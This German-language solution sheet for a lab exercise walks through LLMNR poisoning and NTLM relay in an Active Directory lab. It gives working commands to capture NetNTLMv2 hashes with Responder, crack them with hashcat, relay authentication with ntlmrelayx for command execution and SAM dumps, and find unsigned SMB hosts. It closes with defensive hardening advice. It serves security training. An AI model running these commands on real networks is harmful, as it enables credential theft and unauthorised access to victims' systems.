# Lösung – Übung 07: LLMNR Poisoning & NTLM Relay

`<KALI>` = Kali-IP im AD-Segment.

## 1. Responder → NetNTLMv2 capturen

```bash
sudo responder -I eth0 -wv
```
Wenn ein Client einen nicht auflösbaren Namen sucht (z. B. Tippfehler `\\fileserv`), antwortet Responder und loggt:
```
[SMB] NTLMv2-SSP Hash : jdoe::LAB:1122...:aabb...
```
Hashes liegen unter `/usr/share/responder/logs/`.

## 2. Cracken

```bash
hashcat -m 5600 -a 0 netntlm.hash /usr/share/wordlists/rockyou.txt
```

## 3. NTLM-Relay (ntlmrelayx)

```bash
# Responder: SMB/HTTP aus (damit ntlmrelayx fängt) -> /etc/responder/Responder.conf: SMB=Off, HTTP=Off
sudo responder -I eth0 -wv
# in anderem Terminal relayen:
ntlmrelayx.py -tf targets.txt -smb2support        # targets = Hosts OHNE Signing
# Beispiele:
ntlmrelayx.py -t smb://192.168.20.50 -smb2support -c "whoami"   # Command Exec
ntlmrelayx.py -t smb://192.168.20.50 -smb2support                # dumpt SAM
```
Relayt eine abgefangene Auth in Echtzeit zum Ziel → Zugriff **als das Opfer**, ohne Passwort.

## 4. Signing prüfen

```bash
netexec smb 192.168.20.0/24 --gen-relay-list relay_targets.txt   # Hosts ohne Signing
netexec smb 192.168.20.0/24 | grep -i 'signing:False'
```
Nur Hosts **ohne** erzwungenes Signing sind relay-fähig.

## 5. Cracking vs. Relay + Abwehr

- **Cracking:** Hash → offline Passwort (braucht schwaches PW).
- **Relay:** kein Cracking nötig → direkte Auth beim Ziel (braucht fehlendes Signing + Opfer mit Rechten dort).
- **Abwehr:** **LLMNR/NBT-NS/mDNS deaktivieren** (GPO), **SMB-Signing erzwingen** (verhindert Relay), NTLM einschränken/Kerberos, EDR, Segmentierung.

## Härtung

LLMNR/NBT-NS aus, SMB-Signing required (auf allen Hosts), NTLM minimieren, LAPS/Tiering (Opfer nicht überall Admin).

## Häufige Fehler / Troubleshooting

- **Responder fängt nichts:** kein Broadcast-Traffic → Namensauflösung triggern; richtiges Interface `-I`.
- **Relay scheitert:** Ziel erzwingt Signing (gut) → anderes Ziel/`--gen-relay-list`.
- **Responder vs. ntlmrelayx-Konflikt:** SMB/HTTP in Responder.conf ausschalten, wenn ntlmrelayx fängt.
- **Mode:** NetNTLMv2 = **5600** (v1 = 5500).
